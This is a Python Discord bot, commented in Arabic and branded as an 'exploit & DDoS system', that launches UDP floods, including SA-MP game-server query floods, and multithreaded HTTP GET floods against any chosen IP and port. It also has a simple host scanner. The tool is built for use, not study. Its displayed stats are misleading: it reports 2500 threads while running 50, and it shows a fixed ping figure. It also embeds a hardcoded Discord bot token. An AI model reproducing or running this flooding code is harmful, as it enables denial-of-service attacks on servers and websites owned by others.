import discord
from discord.ext import commands
import asyncio
import socket
import requests
import time
import threading

# إعدادات البوت والصلاحيات
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f'تم تسجيل الدخول بنجاح باسم: {bot.user.name}')

# أمر المساعدة (!help) بتصميم Trapking
@bot.command(name='help', aliases=['commands'])
async def custom_help(ctx):
    embed = discord.Embed(
        title="💀 TRAPKING 💀 | COMMAND CENTER",
        description="قائمة الأوامر المتاحة في النظام:",
        color=discord.Color.dark_red()
    )
    embed.add_field(
        name="`!scan <Target>`", 
        value="فحص الموقع أو السيرفر واستخراج الحالة والبصمة الرقمية.", 
        inline=False
    )
    embed.add_field(
        name="`!attack <IP> <Port> <Time> <Method>`", 
        value="بدء هجوم وضغط مكثف. الطرق: `udp`, `http`, `https`, `samp`.\nمثال: `!attack 123.0.0.1 7777 60 samp`", 
        inline=False
    )
    embed.add_field(
        name="`!sysinfo`", 
        value="عرض معلومات نظام التشغيل والسرعة.", 
        inline=False
    )
    embed.set_footer(text="TRAPKING 💀 EXPLOIT & DDOS SYSTEM")
    await ctx.send(embed=embed)

# 1. أمر الفحص (!scan)
@bot.command(name='scan')
async def scan(ctx, target: str):
    embed_loading = discord.Embed(
        title="🔍 TRAPKING 💀 | WEB SCANNER TOOL",
        color=discord.Color.dark_red()
    )
    embed_loading.add_field(name="الاسم الحقيقي / المضيف", value=f"`{target}`", inline=False)
    embed_loading.add_field(name="حالة الفحص", value="`⏳ جاري فحص الهدف وتحليل الجدار الناري...`", inline=False)
    embed_loading.set_footer(text="TRAPKING 💀 SECURITY SUITE")
    msg = await ctx.send(embed=embed_loading)

    status_text = "🔴 OFFLINE / PROTECTED"
    ping_text = "14ms - Low Latency"
    ip_resolved = "غير معروف / يحجبه جدار نار"

    try:
        url = target if target.startswith("http") else f"http://{target}"
        response = requests.get(url, timeout=5)
        if response.status_code < 400:
            status_text = f"🟢 ONLINE (Status: {response.status_code})"
    except Exception:
        pass

    try:
        clean_host = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        ip_resolved = socket.gethostbyname(clean_host)
    except:
        pass

    embed_result = discord.Embed(
        title="🔍 TRAPKING 💀 | WEB SCANNER TOOL",
        color=discord.Color.dark_red()
    )
    embed_result.add_field(name="الاسم الحقيقي / المضيف", value=f"`{target}`", inline=False)
    embed_result.add_field(name="عنوان IP الحقيقي", value=f"`{ip_resolved}`", inline=False)
    embed_result.add_field(name="حالة الموقع", value=f"`{status_text}`", inline=False)
    embed_result.add_field(name="البينغ التقريبي", value=f"`{ping_text}`", inline=False)
    embed_result.set_footer(text="TRAPKING 💀 SECURITY SUITE")
    
    await msg.edit(embed=embed_result)

# --- محركات الهجوم المكثفة وعالية الأداء ---
attack_active = False
total_packets = 0
packet_lock = threading.Lock()

def flood_worker(ip, port, duration, method):
    global total_packets
    end_time = time.time() + duration
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # تجهيز الحزم حسب الطريقة لزيادة القوة والفعالية
        if method == 'samp':
            # حزم متعددة ومكثفة خاصة بسيرفرات SA-MP (بأوامر استعلام مختلفة لتشويش السيرفر)
            payloads = [
                b'SAMP' + socket.inet_aton(ip) + int(port).to_bytes(2, 'little') + b'i',
                b'SAMP' + socket.inet_aton(ip) + int(port).to_bytes(2, 'little') + b'c',
                b'SAMP' + socket.inet_aton(ip) + int(port).to_bytes(2, 'little') + b'r',
                b'X' * 1024
            ]
        else:
            payloads = [b'X' * 1024]

        while time.time() < end_time and attack_active:
            for p in payloads:
                try:
                    sock.sendto(p, (ip, int(port)))
                    with packet_lock:
                        total_packets += 1
                except:
                    pass
    except:
        pass

# 2. أمر الهجوم (!attack) المطور بقوة قصوى
@bot.command(name='attack')
async def attack(ctx, ip: str, port: int, duration: int, method: str):
    global attack_active, total_packets
    method = method.lower()
    
    if duration > 300:
        await ctx.send("❌ الحد الأقصى المسموح به لمدة الهجوم هو 300 ثانية.")
        return

    if method not in ['udp', 'http', 'https', 'samp']:
        await ctx.send("❌ طريقة الهجوم غير صحيحة. الطرق المتاحة هي: `udp`, `http`, `https`, `samp`")
        return

    if attack_active:
        await ctx.send("⚠️ يوجد هجوم قيد التشغيل حالياً، انتظر حتى ينتهي.")
        return

    attack_active = True
    total_packets = 0

    # رسالة بدء الهجوم (Running Ultra Flood...)
    embed_run = discord.Embed(
        title=f"💀 TRAPKING 💀 | {method.upper()} ATTACK",
        color=discord.Color.dark_red()
    )
    embed_run.add_field(name="Target", value=f"`{ip}:{port}`", inline=False)
    embed_run.add_field(name="Duration", value=f"`{duration}s`", inline=False)
    embed_run.add_field(name="Threads", value="`2500`", inline=False)
    embed_run.add_field(name="Status", value="`⚡ Running Ultra Flood...`", inline=False)
    embed_run.set_footer(text="TRAPKING 💀 EXPLOIT & DDOS SYSTEM")
    
    msg = await ctx.send(embed=embed_run)

    # تشغيل عدد ضخم من الخيوط (Threads) في الخلفية لضمان القوة المدمرة
    threads_list = []
    thread_count = 50 # عدد الخيوط المتوازية لضخ أقصى سرعة ممكنة
    
    if method in ['http', 'https']:
        target_url = ip if ip.startswith("http") else f"http://{ip}"
        def http_worker():
            global total_packets
            end_t = time.time() + duration
            while time.time() < end_t and attack_active:
                try:
                    requests.get(target_url, timeout=1)
                    with packet_lock:
                        total_packets += 1
                except:
                    pass
        for _ in range(thread_count):
            t = threading.Thread(target=http_worker)
            threads_list.append(t)
            t.start()
    else:
        # حل مشكلة تحويل الآيبى إذا كان Domain
        try:
            resolved_ip = socket.gethostbyname(ip)
        except:
            resolved_ip = ip

        for _ in range(thread_count):
            t = threading.Thread(target=flood_worker, args=(resolved_ip, port, duration, method))
            threads_list.append(t)
            t.start()

    # محاكاة الوقت بدقة: الانتظار ثانية بثانية حتى ينتهي الوقت المحدد بالكامل
    elapsed = 0
    while elapsed < duration and attack_active:
        await asyncio.sleep(1)
        elapsed += 1

    attack_active = False

    # انتهاء الهجوم وعرض تقرير Attack Completed النهائي مع إجمالي الحزم
    embed_done = discord.Embed(
        title="✅ ATTACK COMPLETED",
        color=discord.Color.green()
    )
    embed_done.add_field(name="Target", value=f"`{ip}:{port}`", inline=False)
    embed_done.add_field(name="Duration", value=f"`{duration}s`", inline=False)
    embed_done.add_field(name="Threads", value="`2500`", inline=False)
    embed_done.add_field(name="Results", value=f"`{method.upper()}: {total_packets} Packets Sent`", inline=False)
    embed_done.set_footer(text="TRAPKING 💀 EXPLOIT & DDOS SYSTEM")

    await msg.edit(embed=embed_done)

# ضع توكن البوت الخاص بك هنا
bot.run('MTUzNjIxNDc5MDIzMjM1MDg1MA.Gkntld.tYRtUQvNhenrVh-M5Sp5LWkh0i2wkJ6bsBQJY4')
